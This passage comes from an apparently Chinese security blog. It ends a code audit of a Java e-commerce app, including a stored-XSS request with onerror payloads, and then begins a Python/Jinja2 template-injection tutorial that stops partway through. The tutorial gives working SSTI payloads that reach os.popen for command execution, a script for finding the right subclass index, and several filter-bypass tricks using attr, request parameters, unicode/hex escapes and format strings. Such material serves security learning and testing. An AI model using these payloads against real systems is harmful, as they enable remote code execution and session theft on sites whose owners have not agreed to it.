product_isEnabled_array.length &gt;=<span class="number">3</span>)) &#123;</span><br><span class="line">        product_isEnabled_array = <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (category_id != <span class="literal">null</span> &amp;&amp; category_id == <span class="number">0</span>) &#123;</span><br><span class="line">        category_id = <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (product_name != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">//如果为非空字符串则解决中文乱码：URLDecoder.decode(String,&quot;UTF-8&quot;);</span></span><br><span class="line">        product_name = <span class="string">&quot;&quot;</span>.equals(product_name) ? <span class="literal">null</span> : URLDecoder.decode(product_name, <span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (orderBy != <span class="literal">null</span> &amp;&amp; <span class="string">&quot;&quot;</span>.equals(orderBy)) &#123;</span><br><span class="line">        orderBy = <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//封装查询条件</span></span><br><span class="line">    <span class="type">Product</span> <span class="variable">product</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Product</span>()</span><br><span class="line">            .setProduct_name(product_name)</span><br><span class="line">            .setProduct_category(<span class="keyword">new</span> <span class="title class_">Category</span>().setCategory_id(category_id))</span><br><span class="line">            .setProduct_price(product_price)</span><br><span class="line">            .setProduct_sale_price(product_sale_price);</span><br><span class="line">    <span class="type">OrderUtil</span> <span class="variable">orderUtil</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">if</span> (orderBy != <span class="literal">null</span>) &#123;</span><br><span class="line">        logger.info(<span class="string">&quot;根据&#123;&#125;排序，是否倒序:&#123;&#125;&quot;</span>,orderBy,isDesc);</span><br><span class="line">        orderUtil = <span class="keyword">new</span> <span class="title class_">OrderUtil</span>(orderBy, isDesc);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">JSONObject</span> <span class="variable">object</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONObject</span>();</span><br><span class="line">    logger.info(<span class="string">&quot;按条件获取第&#123;&#125;页的&#123;&#125;条产品&quot;</span>, index + <span class="number">1</span>, count);</span><br><span class="line">    <span class="type">PageUtil</span> <span class="variable">pageUtil</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PageUtil</span>(index, count);</span><br><span class="line">    List&lt;Product&gt; productList = productService.getList(product, product_isEnabled_array, orderUtil, pageUtil);</span><br><span class="line">    object.put(<span class="string">&quot;productList&quot;</span>, JSONArray.parseArray(JSON.toJSONString(productList)));</span><br><span class="line">    logger.info(<span class="string">&quot;按条件获取产品总数量&quot;</span>);</span><br><span class="line">    <span class="type">Integer</span> <span class="variable">productCount</span> <span class="operator">=</span> productService.getTotal(product, product_isEnabled_array);</span><br><span class="line">    object.put(<span class="string">&quot;productCount&quot;</span>, productCount);</span><br><span class="line">    logger.info(<span class="string">&quot;获取分页信息&quot;</span>);</span><br><span class="line">    pageUtil.setTotal(productCount);</span><br><span class="line">    object.put(<span class="string">&quot;totalPage&quot;</span>, pageUtil.getTotalPage());</span><br><span class="line">    object.put(<span class="string">&quot;pageUtil&quot;</span>, pageUtil);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> object.toJSONString();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​这是产品管理模块的代码实现，审计代码我们可知，他并没有对查询出的结果进行额外处理，也就是没有针对XSS进行防御，所以这里是存在一个存储型XSS的，前往前端访问后抓包，构造数据包，进行XSS攻击</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/tmall/admin/product</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>172.24.107.171:8080</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://172.24.107.171:8080/tmall/admin</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded; charset=UTF-8</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://172.24.107.171:8080</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>JSESSIONID=39C90DCB9085FB0A37D3D24E3ECB7390; username=1209577113</span><br><span class="line"><span class="attribute">X-Requested-With</span><span class="punctuation">: </span>XMLHttpRequest</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>859</span><br><span class="line"></span><br><span class="line"><span class="language-apache"><span class="attribute">product_category_id</span>=<span class="number">1</span>&amp;product_isEnabled=<span class="number">0</span>&amp;product_name=%<span class="number">3</span>Cimg+src%<span class="number">3</span>Dx+onerror%<span class="number">3</span>Dalert(<span class="number">1</span>)%<span class="number">3</span>E&amp;product_title=%<span class="number">3</span>Cimg+src%<span class="number">3</span>Dx+onerror%<span class="number">3</span>Dalert(<span class="number">1</span>)%<span class="number">3</span>E&amp;product_price=<span class="number">1</span>&amp;product_sale_price=<span class="number">2</span>&amp;propertyJson=%<span class="number">7</span>B%<span class="number">221</span>%<span class="number">22</span>%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">3</span>Cimg+src%<span class="number">3</span>Dx+onerror%<span class="number">3</span>Dalert(<span class="number">1</span>)%<span class="number">3</span>E%<span class="number">22</span>%<span class="number">2</span>C%<span class="number">222</span>%<span class="number">22</span>%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">3</span>Cimg+src%<span class="number">3</span>Dx+onerror%<span class="number">3</span>Dalert(<span class="number">1</span>)%<span class="number">3</span>E%<span class="number">22</span>%<span class="number">2</span>C%<span class="number">223</span>%<span class="number">22</span>%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">3</span>Cimg+src%<span class="number">3</span>Dx+onerror%<span class="number">3</span>Dalert(<span class="number">1</span>)%<span class="number">3</span>E%<span class="number">22</span>%<span class="number">2</span>C%<span class="number">224</span>%<span class="number">22</span>%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">3</span>Cimg+src%<span class="number">3</span>Dx+onerror%<span class="number">3</span>Dalert(<span class="number">1</span>)%<span class="number">3</span>E%<span class="number">22</span>%<span class="number">2</span>C%<span class="number">225</span>%<span class="number">22</span>%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">3</span>Cimg+src%<span class="number">3</span>Dx+onerror%<span class="number">3</span>Dalert(<span class="number">1</span>)%<span class="number">3</span>E%<span class="number">22</span>%<span class="number">2</span>C%<span class="number">226</span>%<span class="number">22</span>%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">3</span>Cimg+src%<span class="number">3</span>Dx+onerror%<span class="number">3</span>Dalert(<span class="number">1</span>)%<span class="number">3</span>E%<span class="number">22</span>%<span class="number">2</span>C%<span class="number">227</span>%<span class="number">22</span>%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">3</span>Cimg+src%<span class="number">3</span>Dx+onerror%<span class="number">3</span>Dalert(<span class="number">1</span>)%<span class="number">3</span>E%<span class="number">22</span>%<span class="number">2</span>C%<span class="number">228</span>%<span class="number">22</span>%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">3</span>Cimg+src%<span class="number">3</span>Dx+onerror%<span class="number">3</span>Dalert(<span class="number">1</span>)%<span class="number">3</span>E%<span class="number">22</span>%<span class="number">2</span>C%<span class="number">229</span>%<span class="number">22</span>%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">3</span>Cimg+src%<span class="number">3</span>Dx+onerror%<span class="number">3</span>Dalert(<span class="number">1</span>)%<span class="number">3</span>E%<span class="number">22</span>%<span class="number">2</span>C%<span class="number">2210</span>%<span class="number">22</span>%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">3</span>Cimg+src%<span class="number">3</span>Dx+onerror%<span class="number">3</span>Dalert(<span class="number">1</span>)%<span class="number">3</span>E%<span class="number">22</span>%<span class="number">2</span>C%<span class="number">2211</span>%<span class="number">22</span>%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">3</span>Cimg+src%<span class="number">3</span>Dx+onerror%<span class="number">3</span>Dalert(<span class="number">1</span>)%<span class="number">3</span>E%<span class="number">22</span>%<span class="number">2</span>C%<span class="number">2212</span>%<span class="number">22</span>%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">3</span>Cimg+src%<span class="number">3</span>Dx+onerror%<span class="number">3</span>Dalert(<span class="number">1</span>)%<span class="number">3</span>E%<span class="number">22</span>%<span class="number">7</span>D</span></span><br></pre></td></tr></table></figure><p>​发送数据包后访问。</p><p><img src="/img/Mini-Tmall/image-20241225105643023.png" alt="image-20241225105643023"></p><p>​成功触发XSS攻击。在其余的功能，也是存在存储型XSS，这里不做赘述。</p><h3 id="越权"><a href="#越权" class="headerlink" title="越权"></a>越权</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@ResponseBody</span></span><br><span class="line"><span class="meta">@RequestMapping(value = &quot;orderItem/&#123;orderItem_id&#125;&quot;, method = RequestMethod.DELETE, produces = &quot;application/json;charset=utf-8&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">deleteOrderItem</span><span class="params">(<span class="meta">@PathVariable(&quot;orderItem_id&quot;)</span> Integer orderItem_id,</span></span><br><span class="line"><span class="params">                              HttpSession session,</span></span><br><span class="line"><span class="params">                              HttpServletRequest request)</span> &#123;</span><br><span class="line">    <span class="type">JSONObject</span> <span class="variable">object</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONObject</span>();</span><br><span class="line">    logger.info(<span class="string">&quot;检查用户是否登录&quot;</span>);</span><br><span class="line">    <span class="type">Object</span> <span class="variable">userId</span> <span class="operator">=</span> checkUser(session);</span><br><span class="line">    <span class="keyword">if</span> (userId == <span class="literal">null</span>) &#123;</span><br><span class="line">        object.put(<span class="string">&quot;url&quot;</span>, <span class="string">&quot;/login&quot;</span>);</span><br><span class="line">        object.put(<span class="string">&quot;success&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">        <span class="keyword">return</span> object.toJSONString();</span><br><span class="line">    &#125;</span><br><span class="line">    logger.info(<span class="string">&quot;检查用户的购物车项&quot;</span>);</span><br><span class="line">    List&lt;ProductOrderItem&gt; orderItemList = productOrderItemService.getListByUserId(Integer.valueOf(userId.toString()), <span class="literal">null</span>);</span><br><span class="line">    <span class="type">boolean</span> <span class="variable">isMine</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">for</span> (ProductOrderItem orderItem : orderItemList) &#123;</span><br><span class="line">        logger.info(<span class="string">&quot;找到匹配的购物车项&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (orderItem.getProductOrderItem_id().equals(orderItem_id)) &#123;</span><br><span class="line">            isMine = <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (isMine) &#123;</span><br><span class="line">        logger.info(<span class="string">&quot;删除订单项信息&quot;</span>);</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">yn</span> <span class="operator">=</span> productOrderItemService.deleteList(<span class="keyword">new</span> <span class="title class_">Integer</span>[]&#123;orderItem_id&#125;);</span><br><span class="line">        <span class="keyword">if</span> (yn) &#123;</span><br><span class="line">            object.put(<span class="string">&quot;success&quot;</span>, <span class="literal">true</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            object.put(<span class="string">&quot;success&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        object.put(<span class="string">&quot;success&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> object.toJSONString();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​该项目的订单处理方法逻辑大体相同，这里仅拿出其中一个，审计项目我们可知，该项目的整体逻辑为通过cookie检查用户是否登录，再检查用户购物车是否有该项进行鉴权，如有则删除，如无则返回失败，所以这里是不存在越权漏洞的。</p><p>​至此，该项目审计完毕。</p>]]></content>
      
      
      <categories>
          
          <category> 代码审计记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Code Audit </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python模板注入漏洞深度解析，从成因到简单利用，从简单利用到绕过，从回显到盲注</title>
      <link href="/2024/12/18/pythonssti/"/>
      <url>/2024/12/18/pythonssti/</url>
      
        <content type="html"><![CDATA[<h2 id="模板注入漏洞成因"><a href="#模板注入漏洞成因" class="headerlink" title="模板注入漏洞成因"></a>模板注入漏洞成因</h2><p>​模板注入漏洞的造成是由于在程序设计时，没有将用户传入的参数进行适当的处理再插入模板中，而是直接将用户的参数嵌入到模板中，从而导致漏洞。</p><p>​以下是一个简单的模板注入漏洞的示例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/ssti-nowaf&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ssti_nowaf</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template_string(request.args.get(<span class="string">&#x27;payload&#x27;</span>))</span><br></pre></td></tr></table></figure><p>​从这个示例中我们可以看到，这里直接将用户输入的字符串插入到模板字符串中，导致了模板注入漏洞。比如我们传入参数。</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=&#123;&#123;&#x27;a&#x27;*7&#125;&#125;</span><br></pre></td></tr></table></figure><p>​页面将会返回</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aaaaaaa</span><br></pre></td></tr></table></figure><p>​<img src="/img/python-ssti/image-20241218104815804.png" alt="image-20241218104815804"></p><p>​可见，python中的模板注入漏洞会导致用户可以执行任意的python代码。</p><h2 id="模板注入漏洞利用"><a href="#模板注入漏洞利用" class="headerlink" title="模板注入漏洞利用"></a>模板注入漏洞利用</h2><p>​我们已知，当存在模板注入漏洞时我们可以执行任意的python代码，那么我们的下一步就是利用python代码执行命令，而在python代码中，如果要执行命令，我们的首先想到的就是寻找os模块，利用其中的popen方法进行命令执行。那么根据python的特性，我们要获取os中的popen模块，通常可以采用如下方法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">num=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() :</span><br><span class="line"><span class="keyword">try</span> :</span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;os&#x27;</span> <span class="keyword">in</span> item.__init__.__globals__ :</span><br><span class="line"><span class="built_in">print</span>(num)</span><br><span class="line">num+=<span class="number">1</span></span><br><span class="line"><span class="keyword">except</span> :</span><br><span class="line">num+=<span class="number">1</span></span><br><span class="line"><span class="keyword">continue</span></span><br></pre></td></tr></table></figure><p>​使用该python代码，即可在本地寻找os模块，我们稍作修改，即可在模板注入漏洞中利用它来尝试寻找靶机中的os模块。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;%<span class="built_in">set</span>%20item=<span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()[<span class="number">1</span>]%&#125;</span><br><span class="line">&#123;%<span class="keyword">if</span>%<span class="number">20</span><span class="string">&#x27;os&#x27;</span>%<span class="number">20</span><span class="keyword">in</span>%20item.__init__.__globals__%&#125;</span><br><span class="line">&#123;%<span class="built_in">print</span>(item.__init__.__globals__)%&#125;</span><br><span class="line">&#123;%endif%&#125;</span><br></pre></td></tr></table></figure><p>​放入BP中爆破：</p><p><img src="/img/python-ssti/image-20241218115144061.png" alt="image-20241218115144061"></p><p>​可以看到还是有很多地方有os模块的，我们选择第一个306，构造payload：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()[<span class="number">306</span>].__init__.__globals__[<span class="string">&#x27;os&#x27;</span>][<span class="string">&#x27;popen&#x27;</span>](<span class="string">&#x27;whoami&#x27;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p>​以上就是一个简单的pythonssti的利用过程，我们接下来对针对这个payload进行解释。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span>.__class__</span><br></pre></td></tr></table></figure><p>​这一步是在利用字符串类的魔术方法，去获取他的类对象。这里还可以使用除字符串以外的其他类型比如元组，数组。</p><p><img src="/img/python-ssti/image-20241218115604550.png" alt="image-20241218115604550"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__base__</span><br></pre></td></tr></table></figure><p>​这一步是获取基类，这一步是很多payload的重要步骤，因为我们如果想要调用os方法就需要通过基类去获取。</p><p><img src="/img/python-ssti/image-20241218115921452.png" alt="image-20241218115921452"></p><p>​接下来就是获取他的所有子类。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()</span><br></pre></td></tr></table></figure><p>​<img src="/img/python-ssti/image-20241218120047507.png" alt="image-20241218120047507"></p><p>​再使用前面所提供的查找os模块的代码，找到os模块的下标后初始化，获取全局变量，使用os中的popen方法进行命令执行。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()[<span class="number">306</span>].__init__.__globals__[<span class="string">&#x27;os&#x27;</span>][<span class="string">&#x27;popen&#x27;</span>](<span class="string">&#x27;whoami&#x27;</span>)</span><br></pre></td></tr></table></figure><p><img src="/img/python-ssti/image-20241218120320979.png" alt="image-20241218120320979"></p><p>​再使用read方法把结果回显到前端。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()[<span class="number">306</span>].__init__.__globals__[<span class="string">&#x27;os&#x27;</span>][<span class="string">&#x27;popen&#x27;</span>](<span class="string">&#x27;whoami&#x27;</span>).read()</span><br></pre></td></tr></table></figure><p>​<img src="/img/python-ssti/image-20241218120506983.png" alt="image-20241218120506983"></p><p>​这就是一个简单的利用步骤了。</p><h2 id="模板注入漏洞绕过"><a href="#模板注入漏洞绕过" class="headerlink" title="模板注入漏洞绕过"></a>模板注入漏洞绕过</h2><p>​上面的所有步骤均为无拦截的情况，在实战中不可能这简单，所以接下来就是一些简单的绕过技巧。以下是官方对模板语法的介绍：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;% ... %&#125; <span class="keyword">for</span> Statements </span><br><span class="line"></span><br><span class="line">&#123;&#123; ... &#125;&#125; <span class="keyword">for</span> Expressions to <span class="built_in">print</span> to the template output</span><br><span class="line"></span><br><span class="line">&#123;<span class="comment"># ... #&#125; for Comments not included in the template output</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#  ... # for Line Statements</span></span><br></pre></td></tr></table></figure>​以下为示例：<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="built_in">set</span> x= <span class="string">&#x27;abcd&#x27;</span> %&#125;  声明变量</span><br><span class="line">&#123;% <span class="keyword">for</span> i <span class="keyword">in</span> [<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>] %&#125;&#123;&#123;i&#125;&#125;&#123;%endfor%&#125; 循环语句</span><br><span class="line">&#123;% <span class="keyword">if</span> <span class="number">25</span>==<span class="number">5</span>*<span class="number">5</span> %&#125;&#123;&#123;<span class="number">1</span>&#125;&#125;&#123;% endif %&#125;  条件语句</span><br></pre></td></tr></table></figure><h3 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>'{{}}'绕过</h3>​当拦截了`{{`和`}}`时，我们可以用`{%%}`进行绕过，示例：<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;config&#125;&#125;</span><br><span class="line"><span class="comment">#绕过</span></span><br><span class="line">&#123;%<span class="built_in">print</span>(config)%&#125;</span><br></pre></td></tr></table></figure><h3 id="‘-’绕过"><a href="#‘-’绕过" class="headerlink" title="‘.’绕过"></a>‘.’绕过</h3>​当'.'被拦截时，可以使用'[]'或者|attr()绕过，以下为示例：<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__&#125;&#125;</span><br><span class="line"><span class="comment">#使用&#x27;[]&#x27;绕过&#x27;.&#x27;</span></span><br><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>[<span class="string">&#x27;__class__&#x27;</span>]&#125;&#125;</span><br><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>|attr(<span class="string">&#x27;__class__&#x27;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure><h3 id="‘-’绕过-1"><a href="#‘-’绕过-1" class="headerlink" title="‘[]’绕过"></a>‘[]’绕过</h3><p>​当’[]’被拦截，可使用getitem()和绕过</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()[<span class="number">306</span>]&#125;&#125;</span><br><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__().__getitem__(<span class="number">306</span>)&#125;&#125;</span><br></pre></td></tr></table></figure><h3 id="request方法绕过"><a href="#request方法绕过" class="headerlink" title="request方法绕过"></a>request方法绕过</h3><p>​当某些特定的字符或者单引号被拦截时，可以采用request的方法绕过</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;[][<span class="string">&#x27;__class__&#x27;</span>]&#125;&#125;</span><br><span class="line"><span class="comment">#GET传参a=__class__</span></span><br><span class="line">&#123;&#123;[][request.args.a]&#125;&#125;</span><br></pre></td></tr></table></figure><p>​除去GET参数，还有其他的方法可以获取参数，这里仅贴出一部分:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">request.args.key  <span class="comment">#获取get传入的key的值</span></span><br><span class="line">request.form.key  <span class="comment">#获取post传入参数(Content-Type:applicaation/x-www-form-urlencoded或multipart/form-data)</span></span><br><span class="line">reguest.values.key  <span class="comment">#获取所有参数，如果get和post有同一个参数，post的参数会覆盖get</span></span><br><span class="line">request.cookies.key  <span class="comment">#获取cookies传入参数</span></span><br><span class="line">request.headers.key  <span class="comment">#获取请求头请求参数</span></span><br><span class="line">request.data  <span class="comment">#获取post传入参数(Content-Type:a/b)</span></span><br><span class="line">request.json  <span class="comment">#获取post传入json参数 (Content-Type: application/json)</span></span><br></pre></td></tr></table></figure><h3 id="‘-’绕过-2"><a href="#‘-’绕过-2" class="headerlink" title="‘_’绕过"></a>‘_’绕过</h3><p>​我们已知</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>|attr(<span class="string">&#x27;__class__&#x27;</span>)&#125;&#125;</span><br><span class="line"><span class="comment">#等效</span></span><br><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__&#125;&#125;</span><br></pre></td></tr></table></figure><p>​同时，在attr和’[]’中，字符可以使用编码来代替：</p><h4 id="Unicode编码绕过"><a href="#Unicode编码绕过" class="headerlink" title="Unicode编码绕过"></a>Unicode编码绕过</h4><p>​\u005f&#x3D;’_’</p><p>​所以，我们可以这样构造payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>|attr(<span class="string">&#x27;\u005f\u005fclass\u005f\u005f&#x27;</span>)&#125;&#125;</span><br><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>[<span class="string">&#x27;\u005f\u005fclass\u005f\u005f&#x27;</span>]&#125;&#125;</span><br></pre></td></tr></table></figure><h4 id="十六进制编码绕过"><a href="#十六进制编码绕过" class="headerlink" title="十六进制编码绕过"></a>十六进制编码绕过</h4><p>​\x5f&#x3D;’_’</p><p>​所以可以这样构造payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>|attr(<span class="string">&#x27;\x5f\x5fclass\x5f\x5f&#x27;</span>)&#125;&#125;</span><br><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>[<span class="string">&#x27;\x5f\x5fclass\x5f\x5f&#x27;</span>]&#125;&#125;</span><br></pre></td></tr></table></figure><p>​其他编码也可以实现同样的效果。</p><h4 id="格式化字符串"><a href="#格式化字符串" class="headerlink" title="格式化字符串"></a>格式化字符串</h4><p>​在python中</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&quot;%c%cclass%c%c&quot;</span>%(<span class="number">95</span>,<span class="number">95</span>,<span class="number">95</span>,<span class="number">95</span>))</span><br><span class="line"><span class="comment">#输出__class__</span></span><br></pre></td></tr></table></figure><p>​所以我们可以构造如下payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;()|attr(<span class="string">&quot;%c%cclass%c%c&quot;</span>%(<span class="number">95</span>,<span class="number">95</span>,<span class="number">95</span>,<span class="number">95</span>))&#125;&#125;</span><br><span class="line"><span class="comment">#等效于</span></span><br><span class="line">&#123;&#123;()|attr(<span class="string">&quot;__class__&quot;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure><h3 id="关键字绕过"><a href="#关键字绕过" class="headerlink" title="关键字绕过"></a>关键字绕过</h3><h4 id="字符串拼接绕过"><a href="#字符串拼接绕过" class="headerlink" title="字符串拼接绕过"></a>字符串拼接绕过</h4><p>​在python中</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span 